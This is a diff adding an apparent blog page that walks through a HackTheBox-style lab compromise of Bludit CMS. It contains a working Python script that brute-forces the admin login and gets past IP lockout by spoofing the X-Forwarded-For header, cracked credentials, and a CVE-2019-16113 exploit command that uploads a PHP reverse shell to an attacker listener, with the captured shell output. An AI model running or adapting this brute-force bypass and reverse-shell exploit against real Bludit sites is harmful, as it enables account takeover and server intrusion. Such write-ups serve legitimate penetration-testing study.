@@ -1,0 +1,74 @@
+---
+title: "Foothold — Bludit Auth Bypass"
+description: "Bruteforce bypass and CVE-2019-16113 RCE on Bludit CMS."
+date: 2024-09-15
+tags: ["htb", "web", "bludit", "cve"]
+---
+
+import Callout from '../../../components/Callout.astro';
+
+## Bruteforce Bypass
+
+Bludit implements a protection that blocks IPs after too many failed login attempts. The protection checks the `X-Forwarded-For` header — which we control.
+
+```python
+#!/usr/bin/env python3
+import requests
+import re
+
+url = "http://10.10.10.191/admin/login"
+wordlist = "/usr/share/wordlists/rockyou.txt"
+
+def get_csrf_token(session):
+    r = session.get(url)
+    match = re.search(r'input type="hidden" id="jstokenCSRF" value="([^"]+)"', r.text)
+    return match.group(1) if match else None
+
+with open(wordlist, encoding="latin-1") as f:
+    passwords = [l.strip() for l in f if len(l.strip()) >= 6]
+
+session = requests.Session()
+for i, password in enumerate(passwords):
+    token = get_csrf_token(session)
+    r = session.post(url, data={
+        "tokenCSRF": token,
+        "username": "fergus",
+        "password": password,
+        "save": "",
+    }, headers={"X-Forwarded-For": f"192.168.{i//256}.{i%256}"})
+    
+    if "password incorrect" not in r.text.lower():
+        print(f"[+] Found: {password}")
+        break
+```
+
+<Callout type="success" title="Credentials Found">
+After running the script against a cewl-generated wordlist:
+
+```
+fergus:RolandDeschain
+```
+</Callout>
+
+## CVE-2019-16113 — Image Upload RCE
+
+Bludit 3.9.2 allows authenticated users to upload `.htaccess` files via the image upload, enabling PHP execution.
+
+```bash
+# Using the PoC
+python3 exploit.py -u http://10.10.10.191 \
+  --user fergus --password RolandDeschain \
+  --payload php-reverse-shell.php \
+  --lhost 10.10.14.X --lport 4444
+```
+
+<Callout type="danger" title="Shell Received">
+```
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.X] from (UNKNOWN) [10.10.10.191] 52890
+Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+</Callout>
